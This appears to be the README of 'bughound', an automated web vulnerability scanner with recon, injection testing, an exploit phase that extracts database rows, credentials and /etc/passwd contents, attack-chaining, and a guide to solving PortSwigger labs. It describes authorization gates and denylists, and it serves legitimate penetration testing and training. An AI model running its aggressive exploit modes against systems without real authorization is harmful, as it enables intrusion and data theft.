```bash
python3 -m venv .venv && . .venv/bin/activate
pip install -e ".[dev]"
```

Optional external tools (auto-detected, gracefully skipped if missing).
When a tool is invoked the terminal prints `→ using tool: <name>` so you always
know which binary is running. Missing tools are skipped with a quiet note.

**Reconnaissance / asset discovery:** amass, assetfinder, findomain, subfinder,
subdomainx, chaos, metabigor, shodan, waybackurls, waymore, gau, urlfinder,
dnsgen, enumerepo, hakrevdns, hakoriginfinder, hakip2host, asnmap, cdncheck,
mapcidr, puredns, shuffledns, massdns, dnsx, httpx, alterx, anew, gf,
qsreplace, dsieve, smap, jsfinder2, jsleak, jsecret, roboxtractor

**HTTP probing / crawling / web discovery:** httpx, katana, hakrawler, ffuf,
feroxbuster, gobuster, dirsearch, gowitness, whatweb, nikto, paramspider,
cmseek, tlsx, interactsh-client, notify

**Web vulnerability testing:** nuclei, sqlmap, dalfox, kxss, Gxss, crlfuzz,
flask-unsign, sisakulint, semgrep, detect-secrets, betterleaks, trufflehog,
gitleaks, kingfisher, s3scanner, cloudfox, grype, gosec

**Network scanning:** nmap, masscan, rustscan, naabu, nping, ncat, nc, tshark,
sshuttle

**OSINT:** sherlock

Actively invoked during scans (when present on PATH): subfinder, amass,
assetfinder, findomain, gau, waybackurls, waymore, katana, httpx, dnsx,
asnmap, cdncheck, tlsx, whatweb, nuclei, nikto, dalfox, nmap, naabu, sqlmap.

Reports include an **Extracted / leaked / hidden data** section that aggregates
every artefact recovered (DB rows, secrets, file contents, tool harvests, …).

## CLI

```bash
# List modules
bughound list-modules

# Safe (passive) scan of your own site
bughound scan https://example.com --authorize-host example.com --i-am-authorized

# Sn1per-style modes: stealth | normal | aggressive | nuke
bughound scan https://example.com --authorize-host example.com --i-am-authorized --mode stealth
bughound scan https://example.com --authorize-host example.com --i-am-authorized --mode nuke

# Aggressive scan (active detection + exploit phase) using a scope file
bughound scan https://example.com --scope scope.yml --i-am-authorized --aggressive

# Aggressive but detection-only (skip the exploit phase)
bughound scan https://example.com --authorize-host example.com --i-am-authorized --aggressive --no-exploit

# Airstrike: multi-target file (each line authorized individually)
bughound scan https://example.com --targets-file targets.txt --authorize-host '*.example.com' --i-am-authorized

# Workspace + continuous monitoring (Sn1per-style diff between runs)
bughound scan https://example.com --authorize-host example.com --i-am-authorized \
    --mode normal --workspace prod-monitor
bughound diff reports/prod-monitor/example.com-latest.json reports/prod-monitor/<newer>.json

# Recon-only pass (passive attack-surface map, no payloads)
bughound recon https://example.com --authorize-host example.com --i-am-authorized

# Map findings to the application's source code (WHERE the bug lives)
bughound scan https://example.com --authorize-host example.com --i-am-authorized \
    --aggressive --source-dir /path/to/app-source

# Direct-exploit mode: push a known-vulnerable endpoint through the full
# exploit chain (UNION -> credentials -> login). Ideal for labs.
bughound scan https://lab.web-security-academy.net/ \
    --authorize-host lab.web-security-academy.net --i-am-authorized \
    --aggressive --no-external \
    --exploit-endpoint 'https://lab.web-security-academy.net/filter?category=Pets' \
    --exploit-param category

# Opt-in default-credential checks (Sn1per -b analogue; 4 pairs, baseline-verified)
bughound scan https://example.com --authorize-host example.com --i-am-authorized --aggressive --brute

# Reports are written to ./reports/<host>-<timestamp>.{md,json}
```

Authorization can be provided by any of: `--scope <file>`, one or more
`--authorize-host <glob>`, or the `BUGHOUND_AUTHORIZED_HOSTS` env var. You must
also pass `--i-am-authorized`.

### Solving a PortSwigger training lab (quick start)

**Step 0 -- make sure the instance is ALIVE (one request, do this first):**

```
python -m bughound check "https://<LAB-ID>.web-security-academy.net/"
```

- `ALIVE -- lab detected: <title> (not solved yet)` -> proceed below.
- `DEAD / EXPIRED LAB` -> click **Access the lab** (or **Restart the lab**)
  on the lab's portswigger.net page, copy the **NEW** URL it opens (every
  fresh instance gets a NEW random subdomain), and re-run `check`. No tool
  can solve a dead instance. Keep the lab browser tab open while scanning --
  instances stop shortly after the browser session ends.

**Step 1 -- scan and solve:**

```
python -m bughound scan "https://<LAB-ID>.web-security-academy.net/" \
    --aggressive --i-am-authorized --timeout 60 --solve-budget 300
```

- The lab is SOLVED when the terminal prints
  `OBJECTIVE COMPLETED -- lab '<title>' is SOLVED` and the report's
  "Objective completion" section shows the platform's own `is-solved`
  banner as evidence.
- If the run ends with the `LAB INSTANCE IS DEAD / EXPIRED / STOPPED`
  banner (or dies mid-scan with it), the instance expired -- spawn a FRESH
  one and re-run against the new URL.
- Without `--aggressive` the exploit/solve phases are disabled
  (detection-only mode) and the lab will NOT be completed.
- If the lab rate-limits the scan ("throttle events" note at the end), wait
  a few minutes, spawn a fresh instance and re-run with lower
  `--concurrency`.

### Troubleshooting: "0 URLs discovered" / no findings

If a scan finishes almost instantly with `Discovered 0 URLs, 0 injectable
targets` and no findings, the target was unreachable. bughound now does a
single pre-flight GET before crawling and emits the exact failure reason:

```
bughound scanning https://lab.web-security-academy.net/ (aggressive mode, timeout=30.0s)
[08:39:12] Probing target https://lab.web-security-academy.net/ (timeout 30.0s)...
[08:39:42]   initial probe failed: ConnectTimeout:
             retrying once with 2x timeout (target may be waking up)...
[08:40:12] Target unreachable -- aborting scan (see report for details).
```

Common fixes (in order of likelihood for online labs / shared-hosting
targets):

1. **Open the URL in your browser first.** PortSwigger Web Security Academy
   labs, AWS Lambda, and similar on-demand runtimes go to sleep after
   inactivity. The first request wakes them up but can take >15s; once awake
   subsequent requests are fast.
2. **Increase the timeout:** `--timeout 60` (default is now 30s; was 15s).
3. **Override the User-Agent:** `--user-agent 'Mozilla/5.0 ...'`. The
   default is now a recent Chrome UA, but if a site still blocks it pass a
   full browser UA string.
4. **Verify scope:** the host must match an `--authorize-host` glob, a
   `--scope` file entry, or the `BUGHOUND_AUTHORIZED_HOSTS` env var.

You can also pass `--debug` for verbose per-request logging.

### Denylist (forbidden / out-of-scope targets)

Mark hosts or URLs as forbidden and bughound will **never** crawl them or send a
single request to them — not during crawling, not from any scanner module, not
via redirects, and not through external tools. Deny rules are enforced at the
HTTP layer before any connection is opened and **override the allowlist**: a
denied target is refused even if it is otherwise in authorized scope.

```bash
bughound scan https://example.com \
  --authorize-host example.com \
  --deny-host admin.example.com \
  --deny-host '*.internal.example.com' \
  --deny-url https://example.com/logout \
  --deny-url https://example.com/billing \
  --i-am-authorized
```

Deny rules can also be supplied via the scope YAML (`denied_hosts`,
`denied_urls`), the `BUGHOUND_DENIED_HOSTS` env var (comma-separated), or the
web API (`deny_hosts`, `deny_urls`). Matching is case-insensitive; `denied_hosts`
uses glob patterns (use `*.example.com` to cover subdomains) and `denied_urls`
matches by URL prefix (trailing slashes and fragments are ignored).

## Web service

```bash
bughound serve --host 127.0.0.1 --port 8000
# open http://127.0.0.1:8000
```

API:
- `POST /api/scan` `{ "url", "authorized": true, "authorize_hosts": [...], "deny_hosts": [...], "deny_urls": [...], "aggressive": false, "exploit": true }`
- `GET /api/scan/{id}` → status, log, result
- `GET /api/scan/{id}/report.md` → Markdown report

## Design

```
authorize + denylist gate -> apply mode (stealth|normal|aggressive|nuke)
  → crawl (same-origin) → discover URLs + injectable params/forms
      → PHASE 1 squads (passive, always):
          RECON SQUAD  : robots-sitemap, dns-recon, subdomain-enum, whois-recon,
                         wayback-urls, tech-fingerprint, waf-detection, http-methods,
                         js-endpoints, admin-panels, api-discovery, backup-files,
                         sourcemap-exposure, email-harvest
          CONFIG SQUAD : security-headers, tls, cookies, cors, info-disclosure, secrets
          (writes structured attack-surface data into result.recon)
      → attack planner (aggressive): recon-informed plan (focus areas, tech notes,
          WAF advice) -> report "Attack plan" section
      → PHASE 2 squads (aggressive only):
          INJECTION SQUAD : sqli, nosqli, command-injection, xss, ssrf,
                            path-traversal, header-injection, open-redirect,
                            xxe-prober, jwt-attacks
          ACCESS SQUAD    : advisory, graphql-hunter, host-header-poison,
                            prototype-pollution, default-logins (--brute only)
      → exploit phase (--aggressive only, disable with --no-exploit):
          re-target every finding with a safe impact-proof exploit
          (UNION extraction, `id` capture, file reads, loopback fetches...)
      → chain phase (exploit-chainer): combines proven findings into attack chains
          (traversal->credentials->takeover, SSRF->internal admin, XSS->session theft...)
      → external tools (recon suite + nuclei/nikto; nmap/naabu/dalfox/sqlmap in aggressive)
      → verification phase (control experiments on non-exploited findings):
          negative controls, repeat consistency, baseline cleanliness,
          fresh canaries, directionality — flagged findings are downgraded
      → code mapping (--source-dir): findings pinned to file+line+sink,
          or behaviour-derived sink reconstruction for black-box targets
      → dedupe findings → JSON + Markdown report
          (executive summary, attack plan, attack chains, per-finding PoC:
           curl + raw HTTP pair + extracted data + repro steps + impact +
           bounty submission draft, vulnerable-code-location section,
           false-positive-analysis table, methodology appendix)
```

Modules live in `bughound/modules/{passive,active}/` and self-register via a
decorator, so adding a check is a single small file. The exploit engine lives
in `bughound/exploits/` (one module per proof technique, plus
`evidence.py` which standardizes the curl / raw-HTTP-pair / repro-steps
artefacts). The false-positive verifier lives in `bughound/verification.py`;
the source-code mapper in `bughound/codemapper.py`. The 0.7 specialist layer
lives in `bughound.agents` (squads / planner / exploit-chainer) and the
Sn1per-style mode/diff machinery in `bughound.modes` + `bughound.diff`.
Recon helpers (DoH DNS lookup, crt.sh subdomain query, fingerprint catalog)
live in `bughound/modules/recon_utils.py`.

## Demo: prove it to yourself

```bash
python examples/vulnerable_app.py          # deliberately vulnerable app on 127.0.0.1:8081
bughound scan http://127.0.0.1:8081/ \
    --authorize-host 127.0.0.1 --i-am-authorized --aggressive --no-external \
    --source-dir examples
```

The generated report will show the SQLi finding with the extracted database
banner and table list, the command-injection finding with the captured
`uid=...` output, the traversal finding with `/etc/passwd` contents, the SSRF
finding with the loopback fingerprint, and the NoSQLi finding with the
authentication bypass — each with its curl one-liner, raw HTTP exchange,
exact vulnerable code location (`examples/vulnerable_app.py`, line, function)
and false-positive analysis.
A pre-generated copy is in `examples/sample-report.md`.

## Tests

```bash
pytest
ruff check .
```
